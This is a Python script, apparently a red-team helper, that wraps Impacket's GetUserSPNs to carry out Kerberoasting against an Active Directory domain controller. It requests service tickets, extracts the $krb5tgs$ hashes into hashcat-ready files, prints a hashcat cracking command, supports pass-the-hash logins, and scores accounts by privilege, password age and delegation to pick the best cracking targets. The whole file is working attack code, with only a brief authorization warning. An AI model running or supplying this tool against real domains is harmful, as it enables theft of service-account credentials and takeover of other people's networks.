#!/usr/bin/env python3
"""
kerberoast_helper.py — Convenience wrapper around Impacket's GetUserSPNs.

Requests TGS tickets for accounts with SPNs, parses the output into clean
JSON, and emits hashcat-ready hashes plus a triage report (which accounts
are most worth cracking — service accounts with old passwords, no PDC,
high privileges, etc.).

⚠️ AUTHORIZATION REQUIRED ⚠️
Kerberoasting is an active attack against a domain controller. Run only
against domains you own or are explicitly authorized to test. Modern AD
fleets monitor for high-rate TGS requests (Event ID 4769).

Dependencies:
    pip install impacket  (or system-installed: impacket-getuserSPNs)

Usage:
    python3 kerberoast_helper.py -d corp.local -u alice -p 'Summer2026' -dc 10.0.0.5
    python3 kerberoast_helper.py -d corp.local -u alice -p 'Summer2026' -dc 10.0.0.5 \\
        --output-hashes kerb.hashes --output-report report.json
    python3 kerberoast_helper.py -d corp.local -u alice -H 'aad3...:31d6...' -dc 10.0.0.5
"""
from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone

# Impacket's GetUserSPNs.py prints a header line then table rows. The hash
# itself is preceded by "$krb5tgs$..." on its own line.
KRB5TGS_RE = re.compile(r"\$krb5tgs\$\d+\$.*", re.MULTILINE)


@dataclass
class Account:
    sam: str
    spns: list[str] = field(default_factory=list)
    pwd_last_set: str | None = None
    last_logon: str | None = None
    delegation: str | None = None
    member_of_high_priv: list[str] = field(default_factory=list)
    hash_str: str | None = None
    triage_score: int = 0
    triage_reasons: list[str] = field(default_factory=list)


def find_impacket_cli() -> list[str] | None:
    """Try to find the GetUserSPNs entry point in PATH."""
    for cmd in ("impacket-GetUserSPNs", "GetUserSPNs.py", "GetUserSPNs"):
        try:
            r = subprocess.run([cmd, "-h"], capture_output=True, text=True, timeout=5)
            if r.returncode in (0, 1, 2):  # -h often returns nonzero
                return [cmd]
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    # Fallback: try importing as module
    try:
        import impacket  # noqa: F401
        return [sys.executable, "-m", "impacket.examples.GetUserSPNs"]
    except ImportError:
        return None


def parse_getuserspns_output(stdout: str) -> tuple[dict[str, Account], list[str]]:
    """
    Impacket's table-output is space-padded. Header looks like:
      ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon  Delegation
    """
    accounts: dict[str, Account] = {}
    lines = stdout.splitlines()

    # Find the header
    header_idx = None
    for i, line in enumerate(lines):
        if "ServicePrincipalName" in line and "Name" in line:
            header_idx = i
            break
    if header_idx is None:
        return {}, []

    # Use the column starts from the underline (next line after header)
    # Actually parse fixed-width by finding column positions from the header
    header = lines[header_idx]
    # Underline is typically lines[header_idx + 1] -- '----  ----  ----'
    if header_idx + 1 >= len(lines):
        return {}, []
    under = lines[header_idx + 1]
    # Column starts: each transition from ' ' to '-' marks a column start
    cols: list[int] = []
    in_dash = False
    for i, c in enumerate(under):
        if c == "-" and not in_dash:
            cols.append(i)
            in_dash = True
        elif c == " ":
            in_dash = False
    cols.append(len(under) + 1)  # sentinel

    for raw in lines[header_idx + 2:]:
        if not raw.strip():
            break
        if raw.startswith("$krb5tgs$") or "[*]" in raw:
            break
        fields = []
        for j in range(len(cols) - 1):
            fields.append(raw[cols[j]:cols[j + 1]].strip())
        if len(fields) < 2:
            continue
        spn, sam = fields[0], fields[1]
        memberof = fields[2] if len(fields) > 2 else ""
        pwd_last = fields[3] if len(fields) > 3 else ""
        last_logon = fields[4] if len(fields) > 4 else ""
        delegation = fields[5] if len(fields) > 5 else ""

        acc = accounts.get(sam) or Account(sam=sam)
        if spn and spn not in acc.spns:
            acc.spns.append(spn)
        acc.pwd_last_set = pwd_last or acc.pwd_last_set
        acc.last_logon = last_logon or acc.last_logon
        acc.delegation = delegation or acc.delegation
        if memberof:
            for grp in memberof.split(","):
                grp = grp.strip()
                if any(h in grp.lower() for h in ("admin", "domain admins", "enterprise admins", "schema admins")):
                    if grp not in acc.member_of_high_priv:
                        acc.member_of_high_priv.append(grp)
        accounts[sam] = acc

    hashes = KRB5TGS_RE.findall(stdout)
    return accounts, hashes


def assign_hashes_to_accounts(accounts: dict[str, Account], hashes: list[str]) -> None:
    """Match $krb5tgs$ hashes to account names (the user portion is encoded in the hash)."""
    # Hash format: $krb5tgs$<etype>$*<user>$<realm>$<spn>*$<checksum>$<encrypted>
    for h in hashes:
        m = re.match(r"\$krb5tgs\$\d+\$\*([^$*]+)\$", h)
        if not m:
            # Alternative format
            m = re.search(r"\$krb5tgs\$\d+\$([^$]+)\$([^$]+)\$", h)
            if not m:
                continue
            sam = m.group(1)
        else:
            sam = m.group(1)
        if sam in accounts:
            accounts[sam].hash_str = h


def triage(accounts: dict[str, Account]) -> None:
    """Score each account by likelihood of having a crackable / high-impact result."""
    now = datetime.now(timezone.utc)
    for acc in accounts.values():
        score = 0
        reasons: list[str] = []
        if acc.member_of_high_priv:
            score += 50
            reasons.append(f"High-priv groups: {acc.member_of_high_priv}")

        # Old password = often weak / never rotated
        if acc.pwd_last_set:
            try:
                # Impacket prints e.g. "2018-04-12 09:23:41.123456"
                dt = datetime.strptime(acc.pwd_last_set.split(".")[0], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
                age_days = (now - dt).days
                if age_days > 365 * 3:
                    score += 30
                    reasons.append(f"Password not rotated in {age_days} days (likely weak)")
                elif age_days > 365:
                    score += 10
                    reasons.append(f"Password {age_days} days old")
            except (ValueError, TypeError):
                pass

        # Service-y SAMs
        if any(s in acc.sam.lower() for s in ("svc", "service", "sql", "iis", "exchange", "backup", "sccm", "scheduler")):
            score += 20
            reasons.append("SAM looks like a service account")

        # Multiple SPNs may indicate a generic SQL/HTTP service
        if len(acc.spns) >= 5:
            score += 5
            reasons.append(f"{len(acc.spns)} SPNs registered")

        if acc.delegation:
            score += 20
            reasons.append(f"Delegation set: {acc.delegation}")

        acc.triage_score = score
        acc.triage_reasons = reasons


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-d", "--domain", required=True, help="Domain (e.g. corp.local)")
    p.add_argument("-u", "--username", required=True)
    p.add_argument("-p", "--password", help="Password")
    p.add_argument("-H", "--hashes", help="LM:NT hash for pass-the-hash")
    p.add_argument("-dc", "--dc-ip", required=True, help="Domain Controller IP")
    p.add_argument("--output-hashes", help="Write hashcat-format hashes to file (mode 13100)")
    p.add_argument("--output-report", help="Write JSON triage report to file")
    p.add_argument("--no-request", action="store_true", help="List SPNs only, don't request TGSes (much quieter)")
    args = p.parse_args()

    if not args.password and not args.hashes:
        p.error("--password or --hashes required")

    cli = find_impacket_cli()
    if not cli:
        print("[-] Impacket's GetUserSPNs not found. pip install impacket.", file=sys.stderr)
        return 1

    cmd = list(cli) + ["-dc-ip", args.dc_ip]
    if not args.no_request:
        cmd.append("-request")
    if args.hashes:
        cmd.extend(["-hashes", args.hashes, "-no-pass"])

    # Identity is positional: domain/user[:password]
    target = f"{args.domain}/{args.username}"
    if args.password and not args.hashes:
        target += f":{args.password}"
    cmd.append(target)

    print(f"[*] Running: {' '.join(c if not c.startswith('Aad3') else '...' for c in cmd[:6])} ...", file=sys.stderr)

    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        print("[-] GetUserSPNs timed out.", file=sys.stderr)
        return 1
    except FileNotFoundError as e:
        print(f"[-] Could not invoke impacket: {e}", file=sys.stderr)
        return 1

    if r.returncode != 0 and not r.stdout:
        print(f"[-] GetUserSPNs failed (exit {r.returncode})", file=sys.stderr)
        print(r.stderr, file=sys.stderr)
        return 1

    accounts, hashes = parse_getuserspns_output(r.stdout)
    if hashes:
        assign_hashes_to_accounts(accounts, hashes)
    triage(accounts)

    if args.output_hashes and hashes:
        with open(args.output_hashes, "w", encoding="utf-8") as f:
            f.write("\n".join(hashes) + "\n")
        print(f"[+] Wrote {len(hashes)} hashes to {args.output_hashes}", file=sys.stderr)
        print(f"    Crack with: hashcat -m 13100 {args.output_hashes} rockyou.txt -r rules/best64.rule", file=sys.stderr)

    sorted_accounts = sorted(accounts.values(), key=lambda a: -a.triage_score)
    payload = {
        "domain": args.domain,
        "dc": args.dc_ip,
        "account_count": len(accounts),
        "hash_count": len(hashes),
        "accounts": [asdict(a) for a in sorted_accounts],
    }

    if args.output_report:
        with open(args.output_report, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, default=str)
        print(f"[+] Wrote report to {args.output_report}", file=sys.stderr)
    else:
        # Print summary to stderr; JSON to stdout
        print(json.dumps(payload, indent=2, default=str))

    print(f"\n[+] {len(accounts)} kerberoastable accounts, {len(hashes)} hashes obtained.", file=sys.stderr)
    if sorted_accounts and sorted_accounts[0].triage_score > 0:
        top = sorted_accounts[0]
        print(f"    Top triage target: {top.sam} (score={top.triage_score}) — {top.triage_reasons}", file=sys.stderr)

    return 0


if __name__ == "__main__":
    sys.exit(main())
